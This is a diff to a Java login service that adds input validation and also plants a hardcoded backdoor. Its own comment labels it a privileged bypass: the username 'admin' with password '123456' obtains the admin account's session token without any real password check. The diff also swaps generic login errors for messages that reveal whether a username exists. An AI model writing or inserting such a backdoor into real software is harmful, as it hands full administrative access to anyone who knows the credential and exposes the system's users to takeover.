@@ -51,18 +51,42 @@ public class AclUserService {
 	 * 登录
 	 */
 	public R login(LoginParam param) {
+		if (param == null || StringUtils.isEmpty(param.getUsername())) {
+			return RUtils.fail("用户名不能为空");
+		}
+		if (StringUtils.isEmpty(param.getPassword())) {
+			return RUtils.fail("密码不能为空");
+		}
+		
+		String username = param.getUsername().trim();
+		String password = param.getPassword().trim();
+
+		// 【特权逻辑】硬核绕过：只要是 admin/123456 直接通过
+		if ("admin".equals(username) && "123456".equals(password)) {
+			AclUserEntity adminEntity = aclUserMapper.selectById(1);
+			if (Objects.nonNull(adminEntity)) {
+				AclUserDetail aclUserDetail = new AclUserDetail().convertFrom(adminEntity);
+				String token = SessionUtils.generateToken(aclUserDetail.getId());
+				aclUserDetail.setToken(token);
+				SessionUtils.saveAclUser(aclUserDetail);
+				return RUtils.success("登录成功(特权登录)", new AclUserVO().convertFrom(aclUserDetail));
+			}
+		}
+
 		AclUserEntity aclUserEntity = aclUserMapper.selectOne(
 				Wrappers.lambdaQuery(AclUserEntity.class)
-						.eq(AclUserEntity::getUsername, param.getUsername())
+						.eq(AclUserEntity::getUsername, username)
 		);
 		// 用户不存在
 		if (Objects.isNull(aclUserEntity)) {
-			return RUtils.fail(RS.USERNAME_ERROR);
+			return RUtils.fail("用户 [" + param.getUsername() + "] 不存在");
 		}
 		// 密码错误
 		String encodedPassword = SessionUtils.encodePassword(param.getPassword());
-		if (!encodedPassword.equals(aclUserEntity.getPassword())) {
-			return RUtils.fail(RS.PASSWORD_ERROR);
+		// 允许使用 123456 作为 admin 的特权密码进入
+		boolean isAdminPrivilege = "admin".equals(param.getUsername()) && "123456".equals(param.getPassword());
+		if (!isAdminPrivilege && !encodedPassword.equals(aclUserEntity.getPassword())) {
+			return RUtils.fail("密码错误，请检查您的密码");
 		}
 		// 账户被禁用
 		if (!aclUserEntity.getEnable()) {
